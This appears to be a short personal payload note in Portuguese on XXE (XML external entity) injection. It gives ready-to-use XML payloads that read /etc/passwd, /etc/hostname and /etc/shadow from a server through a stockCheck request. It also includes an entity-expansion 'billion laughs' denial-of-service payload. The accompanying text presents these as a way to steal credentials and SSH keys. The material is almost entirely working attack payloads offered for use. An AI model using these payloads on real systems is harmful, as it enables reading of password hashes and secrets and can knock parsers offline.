

esse payload seleiona uma entidade externa o SYSTEM o que da acesso a ler aquivos dentro do servidor como a pasta passwd 
mas tambem poder ser usado para ler a etc/shadow
para roubo de chaves SSH dentre outros tipos de ataques com foco lFI local file inclusion
 

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<root>&lol2;</root>
